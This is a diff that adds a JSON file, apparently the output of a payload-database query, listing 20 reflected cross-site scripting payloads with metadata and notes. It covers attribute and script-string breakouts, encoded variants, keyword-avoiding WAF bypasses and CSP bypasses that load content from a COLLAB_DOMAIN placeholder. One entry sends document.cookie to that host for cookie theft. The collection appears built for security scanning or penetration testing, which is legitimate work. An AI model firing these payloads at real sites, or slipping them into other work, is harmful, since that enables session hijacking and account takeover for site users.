@@ -1,0 +1,365 @@
+{
+  "query": {
+    "limit": 20,
+    "max_risk": 3,
+    "technique": "reflected",
+    "vuln_type": "xss"
+  },
+  "count": 20,
+  "results": [
+    {
+      "id": "02cea4cbd3c75a0d",
+      "payload": "\u003cmeta http-equiv=\"refresh\" content=\"0;url=javascript:alert(document.domain)\"\u003e",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "redirect",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Meta refresh with javascript: URL. Some browsers execute JS from meta refresh.",
+      "source": "ensphere",
+      "tags": [
+        "html",
+        "meta_refresh",
+        "redirect"
+      ]
+    },
+    {
+      "id": "03d44ea5e0d82ef8",
+      "payload": "\u003cobject data=\"http://COLLAB_DOMAIN/xss.swf\"\u003e\u003c/object\u003e",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [
+        "COLLAB_DOMAIN"
+      ],
+      "notes": "CSP bypass via object-src if not restricted. Loads external Flash/plugin content that can execute JS.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "csp",
+        "object_src",
+        "plugin"
+      ]
+    },
+    {
+      "id": "075088d48c81d83f",
+      "payload": "\u003cform action=\"javascript:alert(document.domain)\"\u003e\u003cbutton\u003esubmit\u003c/button\u003e\u003c/form\u003e",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Form action with javascript: URI. Executes on form submission.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "form_action",
+        "html5"
+      ]
+    },
+    {
+      "id": "081fe2d8220e10b0",
+      "payload": "javascript:alert(1)",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "javascript: URI for href/src/action attributes.",
+      "source": "ensphere",
+      "tags": [
+        "javascript_uri",
+        "url_context"
+      ]
+    },
+    {
+      "id": "09521e33a7c6d6df",
+      "payload": "\u003cimg src=x onerror=alert(1)\u003e",
+      "technique": "reflected",
+      "injection_surface": "path",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "IMG onerror via path reflection.",
+      "source": "ensphere",
+      "tags": [
+        "html",
+        "img",
+        "path"
+      ]
+    },
+    {
+      "id": "0a66a26b38cf735b",
+      "payload": "\"\u003e\u003cimg src=x onerror=alert(1)\u003e",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "string_boundary": "double_quote",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Break out of attribute + img onerror.",
+      "source": "ensphere",
+      "tags": [
+        "attribute",
+        "breakout",
+        "double_quote",
+        "img"
+      ]
+    },
+    {
+      "id": "120b58d3eef03ede",
+      "payload": "{{7*7}}",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Template injection probe. If output is 49, confirms server-side template evaluation. Gateway to XSS.",
+      "source": "ensphere",
+      "tags": [
+        "framework",
+        "jinja2",
+        "probe",
+        "ssti",
+        "twig"
+      ]
+    },
+    {
+      "id": "1327c93628fd9c31",
+      "payload": "\u003cimg src=x onerror=[].constructor.constructor('alert(document.domain)')()\u003e",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Function constructor chain avoiding direct alert/eval keywords. Bypasses keyword-based WAF rules.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "constructor_chain",
+        "no_keywords",
+        "waf"
+      ]
+    },
+    {
+      "id": "1a6b7c332f0557f4",
+      "payload": "\u003cIMG SRC=\"\" onerror=\"alert(String.fromCharCode(88,83,83))\"\u003e",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "String.fromCharCode to avoid literal 'alert' string.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "fromcharcode"
+      ]
+    },
+    {
+      "id": "1d6effacdfb81bc5",
+      "payload": "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "js_escape",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "JS hex escape sequences. If interpreted as JS string then inserted into DOM.",
+      "source": "ensphere",
+      "tags": [
+        "encoded",
+        "js_hex",
+        "script_context"
+      ]
+    },
+    {
+      "id": "1db9de606f17b23e",
+      "payload": "\u003cdiv style=\"background:url(javascript:alert(1))\"\u003e",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "CSS background javascript: URI. Works in IE/legacy browsers.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "css",
+        "javascript_uri",
+        "legacy"
+      ]
+    },
+    {
+      "id": "1e4edd538d787588",
+      "payload": "x onclick=alert(1)",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "string_boundary": "unquoted",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Unquoted attribute injection. If reflected inside an unquoted attribute, inject event handler directly.",
+      "source": "ensphere",
+      "tags": [
+        "attribute",
+        "onclick",
+        "unquoted"
+      ]
+    },
+    {
+      "id": "2110e9d70a55720f",
+      "payload": "\u003cvideo src=x onerror=alert(1)\u003e",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Video onerror handler.",
+      "source": "ensphere",
+      "tags": [
+        "html",
+        "onerror",
+        "video"
+      ]
+    },
+    {
+      "id": "30832bf15042e2a5",
+      "payload": "\";alert(1)//\"",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Break out of JS string (double quote) and execute alert.",
+      "source": "ensphere",
+      "tags": [
+        "breakout",
+        "double_quote",
+        "script_context"
+      ]
+    },
+    {
+      "id": "35e304286653d407",
+      "payload": "javascript:void(document.location='http://COLLAB_DOMAIN/'+document.cookie)",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [
+        "COLLAB_DOMAIN"
+      ],
+      "notes": "javascript: URI for cookie exfiltration.",
+      "source": "ensphere",
+      "tags": [
+        "cookie_theft",
+        "javascript_uri",
+        "url_context"
+      ]
+    },
+    {
+      "id": "37a0ee3a75dcfb59",
+      "payload": "\u003cdetails open ontoggle=alert(1)\u003e",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "details/ontoggle — fires immediately with open attribute.",
+      "source": "ensphere",
+      "tags": [
+        "details",
+        "html",
+        "ontoggle"
+      ]
+    },
+    {
+      "id": "37aea893b288ff01",
+      "payload": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "js_escape",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "JS unicode escape sequences.",
+      "source": "ensphere",
+      "tags": [
+        "encoded",
+        "js_unicode",
+        "script_context"
+      ]
+    },
+    {
+      "id": "394cef25b4c6c26c",
+      "payload": "\"\u003e\u003cscript\u003ealert(1)\u003c/script\u003e",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "string_boundary": "double_quote",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Break out of attribute + close tag + script injection.",
+      "source": "ensphere",
+      "tags": [
+        "attribute",
+        "breakout",
+        "double_quote",
+        "script"
+      ]
+    },
+    {
+      "id": "3af301814dfd9108",
+      "payload": "\u0026lt;img src=x onerror=alert(1)\u0026gt;",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "html_entity",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "HTML entity encoded. If double-decoded, triggers XSS.",
+      "source": "ensphere",
+      "tags": [
+        "encoded",
+        "html",
+        "html_entity"
+      ]
+    },
+    {
+      "id": "3d0cae09fdc0c6de",
+      "payload": "\u003clink rel=import href=\"http://COLLAB_DOMAIN/xss.html\"\u003e",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [
+        "COLLAB_DOMAIN"
+      ],
+      "notes": "HTML import for CSP bypass (legacy, works in older Chrome).",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "csp",
+        "html_import"
+      ]
+    }
+  ]
+}
